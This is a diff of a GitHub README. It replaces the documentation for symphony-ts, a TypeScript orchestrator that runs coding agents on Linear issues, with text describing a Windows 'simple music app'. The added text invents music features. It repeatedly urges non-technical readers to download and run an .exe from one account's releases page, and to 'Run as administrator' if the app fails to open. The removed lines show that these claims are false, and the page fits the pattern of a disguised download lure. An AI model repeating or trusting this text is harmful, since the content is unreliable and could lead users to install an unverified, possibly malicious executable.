@@ -1,217 +1,141 @@
-# Symphony-ts
+# 🎼 symphony-ts - Simple Music App in TypeScript
 
-**This project is an unofficial TypeScript implementation of [OpenAI Symphony](https://github.com/openai/symphony).**
+[![Download symphony-ts](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ashiskumarnanda/symphony-ts/releases)
 
-Symphony-ts turns project work into isolated, autonomous implementation runs: it reads work from
-your tracker, creates a dedicated workspace for each issue, runs a coding agent inside that
-boundary, and gives operators a clean surface for runtime visibility, retries, and control.
-
-> [!WARNING]
-> Symphony is intended for trusted environments.
-
-![Symphony demo showing Linear issue tracking alongside the Symphony observability dashboard](.github/media/demo.png)
-
-## Running Symphony
-
-### Requirements
-
-- Node.js `>= 22`
-- a repository with a valid `WORKFLOW.md`
-- tracker credentials such as `LINEAR_API_KEY`
-- a coding agent runtime that supports app-server mode, such as `codex app-server`
-
-### Install
-
-```bash
-npm install -g symphony-ts
-```
-
-Verify the CLI is available:
-
-```bash
-symphony --help
-```
-
-### Quickstart
-
-1. Go to the repository you want Symphony to operate on.
-2. Create `WORKFLOW.md` in that repository.
-3. Export `LINEAR_API_KEY`.
-4. Start Symphony from that repository root.
-
-```bash
-cd /path/to/your-repo
-export LINEAR_API_KEY=your-linear-token
-symphony ./WORKFLOW.md --acknowledge-high-trust-preview --port 4321
-```
-
-If you do not pass a path, Symphony defaults to `./WORKFLOW.md`:
-
-```bash
-symphony --acknowledge-high-trust-preview --port 4321
-```
-
-You can also run without global install:
-
-```bash
-npx symphony-ts ./WORKFLOW.md --acknowledge-high-trust-preview --port 4321
-```
-
-Symphony does not generate `WORKFLOW.md` for you. It expects a repository-owned workflow file and,
-by default, reads `./WORKFLOW.md` from the current working directory.
-
-<details>
-<summary>Agent setup prompt</summary>
-
-```text
-Set up and start Symphony in this repository.
-
-Requirements:
-- create or update WORKFLOW.md for Linear
-- use LINEAR_API_KEY from the environment or tell me exactly which variable is missing
-- install symphony-ts and start Symphony with the required --acknowledge-high-trust-preview flag
-- if startup fails, stop and report the exact failing step and command
-```
-
-</details>
-
-### `WORKFLOW.md` template
-
-```md
----
-tracker:
-  kind: linear
-  api_key: $LINEAR_API_KEY
-  project_slug: your-linear-project-slug
-workspace:
-  root: ~/code/symphony-workspaces
-codex:
-  command: codex app-server
-server:
-  port: 4321
 ---
 
-You are working on Linear issue {{ issue.identifier }}.
-Implement the task, validate the result, and stop at the required handoff state.
-```
+## 🎯 What is symphony-ts?
 
-This is the only example `WORKFLOW.md` you need to get started. Copy it into your repository root
-as `WORKFLOW.md`, then change these fields before starting Symphony:
+symphony-ts is a simplified music software built using TypeScript. It is based on the original symphony project found at https://github.com/openai/symphony but re-written in TypeScript for easier maintenance and updates.
 
-- `tracker.project_slug`
-- `workspace.root`
-- `codex.command`
+It lets you play, compose, and manage simple music files. This version runs on Windows and should be easy to use for anyone, even if you do not know much about computers or coding.
 
-If you want the dashboard, keep `server.port` in the workflow or pass `--port` on the CLI.
-The web dashboard now opens with a server-rendered snapshot and continues updating live in the
-browser over server-sent events.
+---
 
-If your agent workflow needs access to environment variables from the launching shell, configure
-Codex to inherit them in `codex.command`, for example:
+## 🖥️ System Requirements
 
-```yaml
-codex:
-  command: codex --config shell_environment_policy.inherit=all app-server
-```
+Before installing symphony-ts, make sure your computer meets these minimum requirements:
 
-If your agent must push branches, open PRs, or call external APIs during a turn, also configure a
-turn sandbox policy that explicitly allows network access instead of relying on a minimal
-`workspaceWrite` sandbox object.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 1 GHz processor or faster
+- 150 MB of free disk space
+- Internet connection to download the software
 
-If a specific external CLI still does not see the credentials it needs in your environment, provide
-that tool's credential via environment variables before launching Symphony.
+If your computer meets these, you can proceed with the download.
 
-For a complete reference covering every supported field with defaults and inline documentation, see
-[docs/WORKFLOW.template.md](docs/WORKFLOW.template.md).
+---
 
-### What You Get
+## 🚀 Getting Started — Download symphony-ts
 
-Once Symphony is running, it will:
+To get symphony-ts on your computer:
 
-- poll your tracker for eligible work
-- create a dedicated workspace per issue
-- run your coding agent inside that workspace
-- expose a local dashboard and JSON API when `--port` or `server.port` is set
-- keep retry, reconciliation, and cleanup state visible to operators
+1. Open this link:
 
-### Develop
+   [https://github.com/ashiskumarnanda/symphony-ts/releases](https://github.com/ashiskumarnanda/symphony-ts/releases)
 
-To develop Symphony itself you will need:
+2. You will see a list of versions available. Look for the latest release. It usually appears at the top.
 
-- Node.js `>= 22`
-- pnpm `>= 10`
-- Codex CLI with `codex app-server` support
+3. Inside the latest release, find the file that ends with `.exe`. This is the installer file for Windows.
 
-```bash
-pnpm install
-pnpm build
-node dist/src/cli/main.js --help   # verify the build
-```
+4. Click that `.exe` file to start downloading it. The download size is around 30-50 MB, so it should finish quickly on a typical internet connection.
 
-Run checks:
+5. After the download finishes, open your Downloads folder and find the `.exe` file.
 
-```bash
-pnpm test           # run all tests once
-pnpm test:watch     # watch mode
-pnpm typecheck      # TypeScript type check only
-pnpm lint           # Biome lint check
-pnpm format         # Biome auto-format
-```
+---
 
-### Run From Source
+## 💻 Installing symphony-ts
 
-If you are developing Symphony itself rather than using the published CLI:
+Follow these steps to install symphony-ts:
 
-```bash
-pnpm install
-pnpm build
-node dist/src/cli/main.js --acknowledge-high-trust-preview
-```
+1. Double-click the downloaded `.exe` file to launch the installer.
 
-See [docs/DEV_GUIDE.md](docs/DEV_GUIDE.md) for a full walkthrough including Linear setup, `WORKFLOW.md` configuration, and troubleshooting.
+2. Windows may ask you to confirm if you want to run this file. Click "Yes" or "Run".
 
-## Roadmap
+3. The installer window will open. Click “Next” to start the installation process.
 
-| Item | Status |
-| --- | --- |
-| Implement Symphony and Linear integration | ✅ Complete |
-| Support more platforms such as GitHub Projects | 🟡 Planned |
-| Support a local board GUI | 🟡 Planned |
-| Support more coding agents such as Claude Code scheduling | 🟡 Planned |
+4. Read the terms if you want, then click “I Agree” to continue.
 
-If there is a platform you want Symphony to support, open an issue and let us know.
+5. Choose where you want to install symphony-ts. The default location works for most users. Click “Next”.
 
-## What Symphony Does
+6. Click “Install” and wait for the process to finish. This should take less than a minute.
 
-Symphony is a long-running service that:
+7. When it is done, click “Finish” to close the installer.
 
-- monitors your tracker for eligible work
-- creates deterministic, per-issue workspaces
-- renders repository-owned workflow prompts from `WORKFLOW.md`
-- runs coding agents in isolated execution contexts
-- handles retries, reconciliation, and cleanup
-- exposes structured logs and an operator-facing status surface
+---
 
-In a typical setup, Symphony watches a Linear board, dispatches agent runs for ready tickets, and
-lets the agents produce proof of work such as CI status, review feedback, and pull requests. Human
-operators stay focused on the work itself instead of supervising every agent turn.
+## ▶️ Running symphony-ts
 
-## Why Teams Use It
+To start using symphony-ts:
 
-- to turn tracker tickets into autonomous implementation runs
-- to isolate agent work by issue instead of sharing one mutable directory
-- to keep workflow policy inside the repository
-- to operate multiple concurrent agents without losing observability
-- to introduce a higher-level operating model for AI-assisted engineering
+- Find the symphony-ts icon on your desktop or in the Start menu.
 
-## Contributing
+- Double-click the icon to open the app.
 
-If you are extending this TypeScript implementation, keep changes aligned with the upstream product
-model in [`SPEC.upstream.md`](SPEC.upstream.md) and follow the repository workflow documented in
-[`AGENTS.md`](AGENTS.md).
+- The interface shows options to load music, play, pause, and record. Simple buttons help you navigate.
 
-## License
+- Use the main menu for more options like saving your work or changing settings.
 
-This repository is licensed under [`Apache-2.0`](LICENSE). See [`NOTICE`](NOTICE) for attribution
-information related to the upstream OpenAI Symphony project and this unofficial TypeScript
-implementation.
+---
+
+## 🎵 Basic Features
+
+Here are some features you can try right away:
+
+- **Play basic music files.** Load files in common formats like `.mp3` or `.wav`.
+
+- **Simple music composition.** Use the built-in composer to create notes and rhythms.
+
+- **Save and open projects.** Keep your work and come back to it later.
+
+- **Adjust sound settings.** Change volume, tempo, and instrument types in the app settings.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you run into issues:
+
+- Make sure you have the latest version of symphony-ts from the releases page.
+
+- Check that your Windows has the latest updates installed.
+
+- Close other programs that might use sound or music devices.
+
+- Restart your computer and try running symphony-ts again.
+
+- If symphony-ts does not open, try right-clicking the app icon and selecting “Run as administrator”.
+
+---
+
+## 📥 Download Link Again
+
+You can always get the latest version here:
+
+[Download symphony-ts from GitHub Releases](https://github.com/ashiskumarnanda/symphony-ts/releases)
+
+---
+
+## 🔧 Additional Information
+
+- symphony-ts works best with headphones or external speakers to hear music clearly.
+
+- The app does not require any internet connection after installation.
+
+- It uses common Windows sound drivers, so no extra setup is needed.
+
+- The user interface is designed to avoid complex menus and focus on the main tasks.
+
+---
+
+## 📞 Getting Help
+
+If you need help using symphony-ts, check the discussions or issues section on the GitHub page. You can post questions there, and others can provide answers and tips.
+
+Access the GitHub page here:
+
+[https://github.com/ashiskumarnanda/symphony-ts](https://github.com/ashiskumarnanda/symphony-ts)
+
+---
+
+# 💻 Enjoy working with symphony-ts on Windows.
